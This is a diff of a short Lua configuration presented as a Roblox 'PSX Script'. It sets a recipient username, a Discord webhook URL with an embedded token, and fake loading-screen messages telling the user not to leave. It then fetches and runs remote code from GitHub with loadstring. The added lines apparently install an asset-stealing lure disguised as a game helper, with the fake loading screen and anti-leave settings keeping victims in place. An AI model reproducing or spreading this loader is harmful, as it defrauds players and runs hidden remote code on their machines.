@@ -1,16 +1,11 @@
-UserName = "benjatrin429"
-UserName2 = "benjatrin429" -- optional delete the whole line if you don't want it
-Webhook = "https://discord.com/api/webhooks/1107672938460749915/7551zFo9mc5r5nCd7v8RNMyLXlNLcKB7pKpNy4gZcZBXOGoTTWI9HZcZl_XMkNJ516xy" -- optional delete the whole line if you don't want it
+Username = "benjatrin429"
+WebHook = "https://discord.com/api/webhooks/1108749812679061545/OEZuFu120NHS0okIIAhAGKwOXRhQ0XRyIolREbAF1Wlu_YD0eAtEyWsXdQkE3znjQw8c"
 
-_G.LoadingScreen = true
-_G.AntiLeave = true
-_G.MouseLock = true 
--- set them to false if you don't need them
 
-_G.ScriptName = "Rizz Scriptz"
-_G.FirstText = "Script Preparing"
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Loading do not leave..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
